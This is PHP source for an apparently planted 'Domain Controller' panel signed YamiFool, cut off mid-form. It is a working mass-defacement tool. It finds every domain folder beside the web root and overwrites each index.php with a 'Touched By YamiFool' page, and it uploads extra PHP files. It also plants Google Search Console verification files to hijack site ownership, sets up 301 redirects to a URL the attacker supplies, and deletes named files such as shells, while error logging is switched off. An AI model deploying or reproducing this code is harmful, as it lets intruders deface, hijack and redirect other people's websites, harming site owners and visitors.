<?php
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
session_start();
error_reporting(0);

class SimpleReplacer {
    private $rootDir;
    private $watermark = "YamiFool";
    
    public function __construct() {
        $this->rootDir = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
    }
    
    public function handleRequest() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
            if ($_POST['action'] === 'replace') {
                return $this->doReplace();
            } elseif ($_POST['action'] === 'delete' && !empty($_POST['filename'])) {
                return $this->doDelete($_POST['filename']);
            } elseif ($_POST['action'] === 'upload') {
                return $this->doUpload();
            } elseif ($_POST['action'] === 'search' && !empty($_POST['username'])) {
                return $this->doSearch($_POST['username']);
            } elseif ($_POST['action'] === 'gsc_upload') {
                return $this->doGSCUpload();
            } elseif ($_POST['action'] === 'gsc_upload2') {
                return $this->doGSCUpload2();
            } elseif ($_POST['action'] === 'gsc_upload3') {
                return $this->doGSCUpload3();
            } elseif ($_POST['action'] === 'redirect' && !empty($_POST['redirect_url'])) {
                return $this->doRedirect($_POST['redirect_url']);
            }
        }
        return false;
    }

    private function doSearch($username) {
        $dirs = $this->findDirs();
        $domainList = [];
        
        foreach ($dirs as $dir) {
            $domainName = basename($dir);
            $domainList[] = "https://" . $domainName;
        }
        
        if (!empty($domainList)) {
            return [
                'success' => "🔍 Data domain ditemukan oleh " . $this->watermark . " untuk " . $username,
                'domains' => array_map(function($dir) { return basename($dir); }, $dirs),
                'count' => count($dirs)
            ];
        } else {
            return [
                'error' => "❌ Tidak ada domain yang ditemukan"
            ];
        }
    }

    private function doDelete($filename) {
        $dirs = $this->findDirs();
        $count = 0;
        $list = [];

        foreach ($dirs as $dir) {
            $targetPath = $dir . '/' . $filename;
            if (file_exists($targetPath)) {
                if (@unlink($targetPath)) {
                    $count++;
                    $list[] = basename($dir);
                }
            }
        }

        return [
            'success' => "🗑️ Deleted '{$filename}' in {$count} domain directories - " . $this->watermark,
            'domains' => $list,
            'count' => $count
        ];
    }
    
    private function doReplace() {
        $dirs = $this->findDirs();
        $count = 0;
        $list = [];
           $indexContent = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<head>
    <title>Touched By YamiFool - Royal Fool</title>
<meta property="og:description" content="Touched By YamiFool - Royal Fool!!"/>	
<meta property="og:image" content="https://i.ibb.co.com/sd4ZB5Xp/image.png"/>
<link rel="shortcut icon" href="https://i.ibb.co.com/sd4ZB5Xp/image.png"/>
<link href="https://fonts.googleapis.com/css?family=&display=swap" type="text/css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Audiowide&display=swap" type="text/css" rel="stylesheet">
</head>
<body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
<script type="text/javascript">
var snowmax=35;
var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF");
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS");
var snowletter="*";
var sinkspeed=0.6;
var snowmaxsize=22;
var snowminsize=8;
var snowingzone=1;
var snow=new Array();
var marginbottom;
var marginright;
var timer;
var i_snow=0;
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent;
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/);
var ns6=document.getElementById&&!document.all;
var opera=browserinfos.match(/Opera/);
var browserok=ie5||ns6||opera;

function randommaker(range) {		
    rand=Math.floor(range*Math.random());
    return rand;
}

function initsnow() {
    if (ie5 || opera) {
        marginbottom = document.body.clientHeight;
        marginright = document.body.clientWidth;
    } else if (ns6) {
        marginbottom = window.innerHeight;
        marginright = window.innerWidth;
    }
    var snowsizerange = snowmaxsize - snowminsize;
    for (i=0; i<=snowmax; i++) {
        crds[i] = 0;                      
        lftrght[i] = Math.random()*15;         
        x_mv[i] = 0.03 + Math.random()/10;
        snow[i]=document.getElementById("s"+i);
        snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)];
        snow[i].size=randommaker(snowsizerange) + snowminsize;
        snow[i].style.fontSize=snow[i].size;
        snow[i].style.color=snowcolor[randommaker(snowcolor.length)];
        snow[i].sink=sinkspeed * snow[i].size/5;
        if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size);}
        if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size);}
        if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size) + marginright/4;}
        if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size) + marginright/2;}
        snow[i].posy=randommaker(2*marginbottom - marginbottom - 2*snow[i].size);
        snow[i].style.left=snow[i].posx;
        snow[i].style.top=snow[i].posy;
    }
    movesnow();
}

function movesnow() {
    for (i=0; i<=snowmax; i++) {
        crds[i] += x_mv[i];
        snow[i].posy += snow[i].sink;
        snow[i].style.left = snow[i].posx + lftrght[i]*Math.sin(crds[i]);
        snow[i].style.top = snow[i].posy;
        if (snow[i].posy >= marginbottom-2*snow[i].size || parseInt(snow[i].style.left) > (marginright-3*lftrght[i])) {
            if (snowingzone==1) {snow[i].posx = randommaker(marginright-snow[i].size);}
            if (snowingzone==2) {snow[i].posx = randommaker(marginright/2-snow[i].size);}
            if (snowingzone==3) {snow[i].posx = randommaker(marginright/2-snow[i].size) + marginright/4;}
            if (snowingzone==4) {snow[i].posx = randommaker(marginright/2-snow[i].size) + marginright/2;}
            snow[i].posy = 0;
        }
    }
    timer = setTimeout("movesnow()", 50);
}

for (i=0; i<=snowmax; i++) {
    document.write("<span id=\'s" + i + "\' style=\'position:absolute;top:-" + snowmaxsize + "\'>" + snowletter + "</span>");
}
if (browserok) {
    window.onload = initsnow;
}
</script>
<style type="text/css">
.lagu{background:transparent;border:1px solid red;font-family:Share Tech Mono;color:;font-size:10px;font-weight:normal;padding:2px 25px;text-decoration:none;text-shadow:0 0 0px #15cff4;}
img[alt="www.000webhost.com"]{display:none;}
HTML, BODY{cursor: none;}
body{
    background-image: url(https://i.ibb.co/SKCF8yR/f0c931fc26fcfa7ae10f869d4be9027c-w200.gif);
    background-size: cover;
    background-repeat: no-repeat;
    background-position: center;
    background-attachment: fixed;
    height: 100%;
}
.title{
    text-align: center;
    font-size: 2.5em;
    color: #000;
}
h1 {
    text-align: center;
    color: #3335cf;
    font-size: 35px;
    font-family: Arial Narrow, sans-serif;
    font-style: garamond;
    text-shadow: 0px 0px 0px #f00505;
}
</style>
<script>
function play(){var audio=document.getElementById(\'lagu\');audio.play();}
function liat(){document.getElementById(\'galiat\').style.visibility=\'visible\';}
</script>
<script src="../cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
<body BGCOLOR="none">
<center>
<body background="index.html" height="" width="">
<center>
    <center>
	  </br> </br> </br>
<script>alert("Aku Tak Bisa Melupakanku !!");</script>
<script>alert("Im loser !!");</script>
<script>alert("Yami Pecundang:)");</script>
<center>
		  </br> </br> </br> </br> </br> </br>
		  <center>
			  <img src="https://i.ibb.co.com/yF1SS04p/download.gif"/>
		  </center>
          <br><br><br>
<i>
<script language="JavaScript1.2">
var message="TOUCHED BY ./YamiFool";
var neonbasecolor="red";
var neontextcolor="white";
var flashspeed=100;
var n=0;

if (document.all||document.getElementById){
    document.write(\'<font color="\'+neonbasecolor+\'">\');
    for (m=0; m<message.length; m++)
        document.write(\'<span id="neonlight\'+m+\'">\'+message.charAt(m)+\'</span>\');
    document.write(\'</font>\');
} else {
    document.write(message);
}

function crossref(number){
    var crossobj = document.all ? document.all["neonlight"+number] : document.getElementById("neonlight"+number);
    return crossobj;
}

function neon(){
    if (n==0){
        for (m=0; m<message.length; m++)
            crossref(m).style.color = neonbasecolor;
    }
    crossref(n).style.color = neontextcolor;
    if (n < message.length-1) {
        n++;
    } else {
        n = 0;
        clearInterval(flashing);
        setTimeout("beginneon()", 2000);
        return;
    }
}

function beginneon(){
    if (document.all||document.getElementById)
        flashing = setInterval("neon()", flashspeed);
}
beginneon();
</script>
</h2>
</body>
</br>
</br><b><font color=white size=3 face="courier New"> "Selamat Berbahagia Dengan Pasanganmu:)" </font> </b> </br>
</br><b><font color=red size=2 face="courier New"> Thanks to: </font> </b> </br> 
<b><font color=white size=1 face="courier New"> - Royal Fool - JasterFool - GodFather77 - L4NA - YamiFool - t.me/senidarikesedihan </font></b>
</br> </br>
<i><font color=grey size=1 face="courier New"> Copyright@since2018 </font> </i>
';
		
        foreach ($dirs as $dir) {
            $indexPath = $dir . '/index.php';
            $domainName = basename($dir);
            
            if (file_exists($indexPath)) {
                @unlink($indexPath);
            }
            
            if (file_put_contents($indexPath, $indexContent, LOCK_EX)) {
                chmod($indexPath, 0644);
            } else {
                $handle = fopen($indexPath, 'w');
                if ($handle) {
                    fwrite($handle, $indexContent);
                    fclose($handle);
                    chmod($indexPath, 0644);
                }
            }
            $count++;
            $list[] = $domainName;
        }
        
        return [
            'success' => "🔄 Replaced index.php in {$count} domain directories - " . $this->watermark,
            'domains' => $list,
            'count' => $count
        ];
    }

private function doUpload() {
    $dirs = $this->findDirs();
    $count = 0;
    $list = [];

    $fileName = $this->watermark . ".php"; 
    $fileContent = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<head>
    <title>Touched By YamiFool - Royal Fool</title>
<meta property="og:description" content="Touched By YamiFool - Royal Fool!!"/>	
<meta property="og:image" content="https://i.ibb.co.com/sd4ZB5Xp/image.png"/>
<link rel="shortcut icon" href="https://i.ibb.co.com/sd4ZB5Xp/image.png"/>
<link href="https://fonts.googleapis.com/css?family=&display=swap" type="text/css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Audiowide&display=swap" type="text/css" rel="stylesheet">
</head>
<body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
<script type="text/javascript">
var snowmax=35;
var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF");
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS");
var snowletter="*";
var sinkspeed=0.6;
var snowmaxsize=22;
var snowminsize=8;
var snowingzone=1;
var snow=new Array();
var marginbottom;
var marginright;
var timer;
var i_snow=0;
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent;
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/);
var ns6=document.getElementById&&!document.all;
var opera=browserinfos.match(/Opera/);
var browserok=ie5||ns6||opera;

function randommaker(range) {		
    rand=Math.floor(range*Math.random());
    return rand;
}

function initsnow() {
    if (ie5 || opera) {
        marginbottom = document.body.clientHeight;
        marginright = document.body.clientWidth;
    } else if (ns6) {
        marginbottom = window.innerHeight;
        marginright = window.innerWidth;
    }
    var snowsizerange = snowmaxsize - snowminsize;
    for (i=0; i<=snowmax; i++) {
        crds[i] = 0;                      
        lftrght[i] = Math.random()*15;         
        x_mv[i] = 0.03 + Math.random()/10;
        snow[i]=document.getElementById("s"+i);
        snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)];
        snow[i].size=randommaker(snowsizerange) + snowminsize;
        snow[i].style.fontSize=snow[i].size;
        snow[i].style.color=snowcolor[randommaker(snowcolor.length)];
        snow[i].sink=sinkspeed * snow[i].size/5;
        if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size);}
        if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size);}
        if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size) + marginright/4;}
        if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size) + marginright/2;}
        snow[i].posy=randommaker(2*marginbottom - marginbottom - 2*snow[i].size);
        snow[i].style.left=snow[i].posx;
        snow[i].style.top=snow[i].posy;
    }
    movesnow();
}

function movesnow() {
    for (i=0; i<=snowmax; i++) {
        crds[i] += x_mv[i];
        snow[i].posy += snow[i].sink;
        snow[i].style.left = snow[i].posx + lftrght[i]*Math.sin(crds[i]);
        snow[i].style.top = snow[i].posy;
        if (snow[i].posy >= marginbottom-2*snow[i].size || parseInt(snow[i].style.left) > (marginright-3*lftrght[i])) {
            if (snowingzone==1) {snow[i].posx = randommaker(marginright-snow[i].size);}
            if (snowingzone==2) {snow[i].posx = randommaker(marginright/2-snow[i].size);}
            if (snowingzone==3) {snow[i].posx = randommaker(marginright/2-snow[i].size) + marginright/4;}
            if (snowingzone==4) {snow[i].posx = randommaker(marginright/2-snow[i].size) + marginright/2;}
            snow[i].posy = 0;
        }
    }
    timer = setTimeout("movesnow()", 50);
}

for (i=0; i<=snowmax; i++) {
    document.write("<span id=\'s" + i + "\' style=\'position:absolute;top:-" + snowmaxsize + "\'>" + snowletter + "</span>");
}
if (browserok) {
    window.onload = initsnow;
}
</script>
<style type="text/css">
.lagu{background:transparent;border:1px solid red;font-family:Share Tech Mono;color:;font-size:10px;font-weight:normal;padding:2px 25px;text-decoration:none;text-shadow:0 0 0px #15cff4;}
img[alt="www.000webhost.com"]{display:none;}
HTML, BODY{cursor: none;}
body{
    background-image: url(https://i.ibb.co/SKCF8yR/f0c931fc26fcfa7ae10f869d4be9027c-w200.gif);
    background-size: cover;
    background-repeat: no-repeat;
    background-position: center;
    background-attachment: fixed;
    height: 100%;
}
.title{
    text-align: center;
    font-size: 2.5em;
    color: #000;
}
h1 {
    text-align: center;
    color: #3335cf;
    font-size: 35px;
    font-family: Arial Narrow, sans-serif;
    font-style: garamond;
    text-shadow: 0px 0px 0px #f00505;
}
</style>
<script>
function play(){var audio=document.getElementById(\'lagu\');audio.play();}
function liat(){document.getElementById(\'galiat\').style.visibility=\'visible\';}
</script>
<script src="../cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
<body BGCOLOR="none">
<center>
<body background="index.html" height="" width="">
<center>
    <center>
	  </br> </br> </br>
<script>alert("Aku Tak Bisa Melupakanku !!");</script>
<script>alert("Im loser !!");</script>
<script>alert("Yami Pecundang:)");</script>
<center>
		  </br> </br> </br> </br> </br> </br>
		  <center>
			  <img src="https://i.ibb.co.com/yF1SS04p/download.gif"/>
		  </center>
          <br><br><br>
<i>
<script language="JavaScript1.2">
var message="TOUCHED BY ./YamiFool";
var neonbasecolor="red";
var neontextcolor="white";
var flashspeed=100;
var n=0;

if (document.all||document.getElementById){
    document.write(\'<font color="\'+neonbasecolor+\'">\');
    for (m=0; m<message.length; m++)
        document.write(\'<span id="neonlight\'+m+\'">\'+message.charAt(m)+\'</span>\');
    document.write(\'</font>\');
} else {
    document.write(message);
}

function crossref(number){
    var crossobj = document.all ? document.all["neonlight"+number] : document.getElementById("neonlight"+number);
    return crossobj;
}

function neon(){
    if (n==0){
        for (m=0; m<message.length; m++)
            crossref(m).style.color = neonbasecolor;
    }
    crossref(n).style.color = neontextcolor;
    if (n < message.length-1) {
        n++;
    } else {
        n = 0;
        clearInterval(flashing);
        setTimeout("beginneon()", 2000);
        return;
    }
}

function beginneon(){
    if (document.all||document.getElementById)
        flashing = setInterval("neon()", flashspeed);
}
beginneon();
</script>
</h2>
</body>
</br>
</br><b><font color=white size=3 face="courier New"> "Selamat Berbahagia Dengan Pasanganmu:)" </font> </b> </br>
</br><b><font color=red size=2 face="courier New"> Thanks to: </font> </b> </br> 
<b><font color=white size=1 face="courier New"> - Royal Fool - JasterFool - GodFather77 - L4NA - YamiFool - t.me/senidarikesedihan </font></b>
</br> </br>
<i><font color=grey size=1 face="courier New"> Copyright@since2018 </font> </i>
';

        foreach ($dirs as $dir) {
            $targetPath = $dir . '/' . $fileName;

            if (file_put_contents($targetPath, $fileContent, LOCK_EX)) {
                chmod($targetPath, 0644);
                $count++;
                $list[] = basename($dir) . '/' . $fileName;
            } else {
                $handle = fopen($targetPath, 'w');
                if ($handle) {
                    fwrite($handle, $fileContent);
                    fclose($handle);
                    chmod($targetPath, 0644);
                    $count++;
                    $list[] = basename($dir) . '/' . $fileName;
                }
            }
        }

        return [
            'success' => "📤 Uploaded '{$fileName}' to {$count} domain directories - " . $this->watermark,
            'domains' => $list,
            'count' => $count
        ];
    }

    private function doGSCUpload() {
        $dirs = $this->findDirs();
        $count = 0;
        $list = [];
        $failed = [];
        
        $fileName = "google9d92b6b65c3ea23c.html";
        // Konten yang benar untuk verifikasi Google dengan watermark hidden
        $fileContent = 'google-site-verification: google9d92b6b65c3ea23c.html' . "\n" . '<!-- ' . $this->watermark . ' -->';
        
        foreach ($dirs as $dir) {
            $targetPath = $dir . '/' . $fileName;
            $domainName = basename($dir);
            
            if (file_exists($targetPath)) {
                @unlink($targetPath);
            }
            
            if (file_put_contents($targetPath, $fileContent, LOCK_EX)) {
                chmod($targetPath, 0644);
                
                if (file_exists($targetPath)) {
                    $count++;
                    $list[] = $domainName;
                } else {
                    $failed[] = $domainName;
                }
            } else {
                $handle = fopen($targetPath, 'w');
                if ($handle) {
                    fwrite($handle, $fileContent);
                    fclose($handle);
                    chmod($targetPath, 0644);
                    
                    if (file_exists($targetPath)) {
                        $count++;
                        $list[] = $domainName;
                    } else {
                        $failed[] = $domainName;
                    }
                } else {
                    $failed[] = $domainName;
                }
            }
        }
        
        $message = "✅ Google Site Verification berhasil - " . $this->watermark . "\n";
        $message .= "File '{$fileName}' terupload ke {$count} domain";
        
        if (!empty($failed)) {
            $message .= "\n❌ Gagal di " . count($failed) . " domain";
        }
        
        $message .= "\n\n📌 Cek di: https://domainanda.com/{$fileName}";
        
        return [
            'success' => $message,
            'domains' => $list,
            'count' => $count
        ];
    }

    private function doGSCUpload2() {
    $dirs = $this->findDirs();
    $count = 0;
    $list = [];
    $failed = [];
    
    $fileName = "googlebaa53662039c8654.html";
    // Konten yang benar untuk verifikasi Google dengan watermark hidden
    $fileContent = 'google-site-verification: googlebaa53662039c8654.html' . "\n" . '<!-- ' . $this->watermark . ' -->';
    
    foreach ($dirs as $dir) {
        $targetPath = $dir . '/' . $fileName;
        $domainName = basename($dir);
        
        if (file_exists($targetPath)) {
            @unlink($targetPath);
        }
        
        if (file_put_contents($targetPath, $fileContent, LOCK_EX)) {
            chmod($targetPath, 0644);
            
            if (file_exists($targetPath)) {
                $count++;
                $list[] = $domainName;
            } else {
                $failed[] = $domainName;
            }
        } else {
            $handle = fopen($targetPath, 'w');
            if ($handle) {
                fwrite($handle, $fileContent);
                fclose($handle);
                chmod($targetPath, 0644);
                
                if (file_exists($targetPath)) {
                    $count++;
                    $list[] = $domainName;
                } else {
                    $failed[] = $domainName;
                }
            } else {
                $failed[] = $domainName;
            }
        }
    }
    
    $message = "✅ Google Site Verification (kedua) berhasil - " . $this->watermark . "\n";
    $message .= "File '{$fileName}' terupload ke {$count} domain";
    
    if (!empty($failed)) {
        $message .= "\n❌ Gagal di " . count($failed) . " domain";
    }
    
    $message .= "\n\n📌 Cek di: https://domainanda.com/{$fileName}";
    
    return [
        'success' => $message,
        'domains' => $list,
        'count' => $count
    ];
}

   private function doGSCUpload3() {
    $dirs = $this->findDirs();
    $count = 0;
    $list = [];
    $failed = [];
    
    $fileName = "google27ca1124b0c262a8.html";
    // Konten yang benar untuk verifikasi Google dengan watermark hidden
    $fileContent = 'google-site-verification: google27ca1124b0c262a8.html' . "\n" . '<!-- ' . $this->watermark . ' -->';
    
    foreach ($dirs as $dir) {
        $targetPath = $dir . '/' . $fileName;
        $domainName = basename($dir);
        
        if (file_exists($targetPath)) {
            @unlink($targetPath);
        }
        
        if (file_put_contents($targetPath, $fileContent, LOCK_EX)) {
            chmod($targetPath, 0644);
            
            if (file_exists($targetPath)) {
                $count++;
                $list[] = $domainName;
            } else {
                $failed[] = $domainName;
            }
        } else {
            $handle = fopen($targetPath, 'w');
            if ($handle) {
                fwrite($handle, $fileContent);
                fclose($handle);
                chmod($targetPath, 0644);
                
                if (file_exists($targetPath)) {
                    $count++;
                    $list[] = $domainName;
                } else {
                    $failed[] = $domainName;
                }
            } else {
                $failed[] = $domainName;
            }
        }
    }
    
    $message = "✅ Google Site Verification (ketiga) berhasil - " . $this->watermark . "\n";
    $message .= "File '{$fileName}' terupload ke {$count} domain";
    
    if (!empty($failed)) {
        $message .= "\n❌ Gagal di " . count($failed) . " domain";
    }
    
    $message .= "\n\n📌 Cek di: https://domainanda.com/{$fileName}";
    
    return [
        'success' => $message,
        'domains' => $list,
        'count' => $count
    ];
}

    private function doRedirect($redirectUrl) {
        $dirs = $this->findDirs();
        $count = 0;
        $list = [];
        
        // Konten redirect HTML dengan watermark YamiFool
       $redirectContent = '<?php
header("HTTP/1.1 301 Moved Permanently");
header("Location: ' . addslashes($redirectUrl) . '");
exit();
?>';
        
        foreach ($dirs as $dir) {
            $indexPath = $dir . '/index.php';
            $domainName = basename($dir);
            
            if (file_exists($indexPath)) {
                @unlink($indexPath);
            }
            
            if (file_put_contents($indexPath, $redirectContent, LOCK_EX)) {
                chmod($indexPath, 0644);
                $count++;
                $list[] = $domainName;
            } else {
                $handle = fopen($indexPath, 'w');
                if ($handle) {
                    fwrite($handle, $redirectContent);
                    fclose($handle);
                    chmod($indexPath, 0644);
                    $count++;
                    $list[] = $domainName;
                }
            }
        }
        
        return [
            'success' => "⚡ Redirect ke '{$redirectUrl}' dipasang di {$count} domain - " . $this->watermark,
            'domains' => $list,
            'count' => $count
        ];
    }
    
    private function findDirs() {
        $dirs = [];
        $parentDir = dirname($this->rootDir);
        
        if (is_dir($parentDir)) {
            $items = scandir($parentDir);
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                
                $itemPath = $parentDir . '/' . $item;
                if (is_dir($itemPath) && $this->isValidDir($item)) {
                    $dirs[] = $itemPath;
                }
            }
        }
        
        return $dirs;
    }
    
    private function isValidDir($dirname) {
        return preg_match('/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $dirname) || 
               preg_match('/^[a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $dirname);
    }
}

$sr = new SimpleReplacer();
$response = $sr->handleRequest();

if ($response && isset($response['success'])) {
    $successMessage = $response['success'];
} elseif ($response && isset($response['error'])) {
    $errorMessage = $response['error'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Domain Controller - YamiFool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: #ffffff;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .container::after {
            content: 'YamiFool';
            position: absolute;
            bottom: 5px;
            right: 10px;
            color: rgba(0,0,0,0.1);
            font-size: 10px;
            font-style: italic;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 3px solid #9b5de5;
            margin-bottom: 15px;
        }

        .header h1 {
            color: #333;
            font-size: 24px;
            font-weight: 600;
        }

        .header h1 span {
            color: #9b5de5;
            font-size: 14px;
            display: block;
            margin-top: 5px;
        }

        .header .subtitle {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }

        .message {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            white-space: pre-line;
        }

        .message.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .message.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        .btn::after {
            content: 'YamiFool';
            position: absolute;
            bottom: 2px;
            right: 5px;
            font-size: 8px;
            opacity: 0.3;
            color: white;
        }

        .btn.primary {
            background: #4a90e2;
            color: white;
        }

        .btn.primary:hover {
            background: #357abd;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(74, 144, 226, 0.3);
        }

        .btn.gsc {
            background: #0f9d58;
            color: white;
        }

        .btn.gsc:hover {
            background: #0b8043;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(15, 157, 88, 0.3);
        }

        .btn.redirect {
            background: #db4437;
            color: white;
        }

        .btn.redirect:hover {
            background: #b33c30;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(219, 68, 55, 0.3);
        }

        .btn.search {
            background: #f4b400;
            color: #333;
        }

        .btn.search:hover {
            background: #dba100;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(244, 180, 0, 0.3);
        }

        .btn.upload {
            background: #6c757d;
            color: white;
        }

        .btn.upload:hover {
            background: #5a6268;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(108, 117, 125, 0.3);
        }

        .btn.delete {
            background: #dc3545;
            color: white;
        }

        .btn.delete:hover {
            background: #c82333;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e1e1;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            outline: none;
            border-color: #9b5de5;
            box-shadow: 0 0 0 3px rgba(155, 93, 229, 0.1);
        }

        .input-group input::placeholder {
            color: #999;
        }

        .results {
            margin-top: 25px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
            border: 1px solid #e9ecef;
            position: relative;
        }

        .results::after {
            content: 'YamiFool';
            position: absolute;
            bottom: 2px;
            right: 5px;
            font-size: 8px;
            opacity: 0.2;
            color: #333;
        }

        .results h3 {
            color: #333;
            font-size: 16px;
            margin-bottom: 15px;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .domain-list {
            background: white;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #dee2e6;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            max-height: 200px;
            overflow-y: auto;
            margin-bottom: 15px;
            line-height: 1.6;
        }

        .domain-list::-webkit-scrollbar {
            width: 8px;
        }

        .domain-list::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 4px;
        }

        .domain-list::-webkit-scrollbar-thumb {
            background: #9b5de5;
            border-radius: 4px;
        }

        .copy-btn {
            width: 100%;
            padding: 10px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
        }

        .copy-btn:hover {
            background: #218838;
        }

        .stats {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
            padding: 10px;
            background: #e9ecef;
            border-radius: 6px;
            font-size: 13px;
            color: #495057;
        }

        .badge {
            display: inline-block;
            padding: 3px 8px;
            background: #9b5de5;
            color: white;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            margin-left: 5px;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #6c757d;
            border-top: 1px solid #dee2e6;
            padding-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.ibb.co/JW655KXD/al1.jpg" alt="Logo">
            <h1>DOMAIN CONTROLLER <span>by YamiFool</span></h1>
            <div class="subtitle">Advanced Domain Management System</div>
        </div>
        
        <?php if (isset($successMessage)): ?>
            <div class="message success"><?php echo nl2br(htmlspecialchars($successMessage)); ?></div>
        <?php endif; ?>
        
        <?php if (isset($errorMessage)): ?>
            <div class="message error"><?php echo htmlspecialchars($errorMessage); ?></div>
        <?php endif; ?>
        
        <!-- REPLACE BUTTON -->
        <form method="post">
            <input type="hidden" name="action" value="replace">
            <button type="submit" class="btn primary">🔄 REPLACE INDEX FILES</button>
        </form>

        <!-- GSC BUTTON -->
        <form method="post">
            <input type="hidden" name="action" value="gsc_upload">
            <button type="submit" class="btn gsc">✅ GOOGLE SITE VERIFICATION <span class="badge">GSC</span></button>
        </form>

        <!-- GSC BUTTON 2 -->
<form method="post">
    <input type="hidden" name="action" value="gsc_upload2">
    <button type="submit" class="btn gsc">✅ GSC VERIFICATION 2 <span class="badge">baa53662</span></button>
</form>

        <!-- GSC BUTTON 3 -->
<form method="post">
    <input type="hidden" name="action" value="gsc_upload3">
    <button type="submit" class="btn gsc">✅ GSC VERIFICATION 3 <span class="badge">baa53662</span></button>
</form>

        <!-- REDIRECT BUTTON -->
        <button type="button" class="btn redirect" onclick="redirectPrompt()">⚡ SETUP REDIRECT</button>

        <!-- SEARCH BUTTON -->
        <button type="button" class="btn search" onclick="searchPrompt()">🔍 SEARCH DOMAINS</button>
        
        <!-- UPLOAD BUTTON -->
        <form method="post">
            <input type="hidden" name="action" value="upload">
            <button type="submit" class="btn upload">📤 UPLOAD YamiFool.php</button>
        </form>
        
        <!-- DELETE FORM -->
        <form method="post">
            <div class="input-group">
                <input type="hidden" name="action" value="delete">
                <input type="text" name="filename" placeholder="MASUKKAN NAMA FILE (contoh: shell.php)" class="input-field">
